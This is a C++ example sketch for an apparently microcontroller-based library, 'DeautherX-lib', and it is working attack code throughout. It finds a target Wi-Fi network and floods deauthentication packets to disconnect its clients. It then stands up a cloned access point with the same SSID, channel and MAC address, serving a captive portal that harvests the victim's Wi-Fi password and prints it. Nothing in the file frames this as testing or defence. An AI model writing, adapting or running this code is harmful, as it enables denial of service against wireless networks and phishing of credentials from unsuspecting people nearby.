/*
 * DeautherX-lib — EvilTwin Example
 *
 * The ultimate attack: clones a target network, kicks everyone off the real one,
 * and forces them to connect to our clone to type their Wi-Fi password.
 */

#include <DeautherLib.h>

DeautherScanner  scanner;
DeautherAttack   attack;
DeautherEvilTwin evilTwin;

const char* TARGET_SSID = "MyHomeNetwork";

// Callback when victim types their password into the captive portal
void onPasswordGot(const String& ssid, const String& password) {
    Serial.println(F("\n========================================"));
    Serial.println(F("       🚨 PASSWORD CAPTURED 🚨          "));
    Serial.println(F("========================================"));
    Serial.print(F("SSID     : ")); Serial.println(ssid);
    Serial.print(F("Password : ")); Serial.println(password);
    Serial.println(F("========================================\n"));
    
    // Stop the attack now that we won
    attack.stop();
    
    // Stop the Evil Twin to let them connect back to the real network
    evilTwin.stop();
    Serial.println(F("Attack stopped. Victim released."));
}

void setup() {
    Serial.begin(115200);
    Serial.println(F("\n[EvilTwin Demo] Starting..."));

    // Phase 1: Scan for our target
    Serial.println(F("Scanning..."));
    scanner.startAP();
    delay(4000);

    scanner.selectAPsBySSID(TARGET_SSID);
    DeautherAP* target = scanner.getAPs().findByBSSID(
        scanner.getAPs().get(0) ? scanner.getAPs().get(0)->getBSSID() : nullptr
    );

    if (!target) {
        Serial.println(F("Target network not found! Halt."));
        while(true) delay(100);
    }

    Serial.print(F("Target Found: ")); Serial.print(target->getSSIDStr());
    Serial.print(F(" on Ch: ")); Serial.println(target->getChannel());

    // Phase 2: Start Deauth Attack
    DeauthConfig deauthCfg;
    deauthCfg.targets.addAP(target->getBSSID(), target->getChannel());
    deauthCfg.pkt_rate = 30; // Aggressive
    attack.start(&deauthCfg, nullptr, nullptr);

    // Phase 3: Spin up Evil Twin Clone on the same channel
    PortalConfig etCfg;
    etCfg.ssid    = target->getSSIDStr().c_str();
    etCfg.channel = target->getChannel();
    // Use target's MAC for perfect cloning
    memcpy((uint8_t*)etCfg.bssid, target->getBSSID(), 6);
    
    evilTwin.onCredential(onPasswordGot);
    evilTwin.start(etCfg);
    
    Serial.println(F("Evil Twin active. Deauth active. Waiting for victim..."));
}

void loop() {
    // Keep attacking
    attack.update();
    
    // Serve portal
    evilTwin.update();
}
